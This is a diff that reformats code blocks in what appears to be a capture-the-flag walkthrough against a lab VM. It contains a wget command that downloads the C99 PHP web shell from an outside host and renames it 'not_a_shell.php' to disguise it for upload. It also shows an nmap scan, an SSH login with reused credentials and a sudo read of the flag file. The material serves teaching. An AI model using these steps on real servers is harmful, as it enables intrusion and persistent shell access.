@@ -205,9 +205,11 @@ recommend [Weevely](https://github.com/epinna/weevely3) but for this example
 we'll stick to the more simple C99 shell) and generate a valid hash for
 uploading:
 
-    $ wget http://www.r57shell.net/shell/c99.txt
-    $ mv c99.txt not_a_shell.php
-    $ echo -n "not_a_shell.phpErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd" | sha1sum
+```shell
+$ wget http://www.r57shell.net/shell/c99.txt
+$ mv c99.txt not_a_shell.php
+$ echo -n "not_a_shell.phpErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd" | sha1sum
+```
 
 This gives us:
 
@@ -266,31 +268,37 @@ We now need to be able to log in to the the system. Without physical access to
 the box we can perform an [nmap](http://nmap.org/) scan to see what services are
 up and running:
 
-    $ nmap -sT 192.168.0.170
+```shell
+$ nmap -sT 192.168.0.170
 
-    Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-16 10:48 MST
-    Nmap scan report for 192.168.0.170
-    Host is up (0.0034s latency).
-    Not shown: 998 closed ports
-    PORT   STATE SERVICE
-    22/tcp open  ssh
-    80/tcp open  http
+Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-16 10:48 MST
+Nmap scan report for 192.168.0.170
+Host is up (0.0034s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
 
-    Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
+Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
+```
 
 Here we see that SSH is running on the target machine. The last question
 remaining now is wether or not the `ghost` user was smart enough to use
 different passwords for his system account and his web application accounts.
 All we have to do to test this is SSH into the server with his credentials:
 
-    $ ssh ghost@192.168.0.170  # Substitute your VMs IP
-    ghost@192.168.0.170's password:
+```shell
+$ ssh ghost@192.168.0.170  # Substitute your VMs IP
+ghost@192.168.0.170's password:
+```
 
 Enter the ghost user's password and BOOM! We're in! All we have to do is grab
 the content of flag:
 
-    $ sudo cat /var/www/SpookiLeaks/Docs/flag.txt
-    [sudo] password for ghost:
+```shell
+$ sudo cat /var/www/SpookiLeaks/Docs/flag.txt
+[sudo] password for ghost:
+```
 
 And you've got the flag:
 
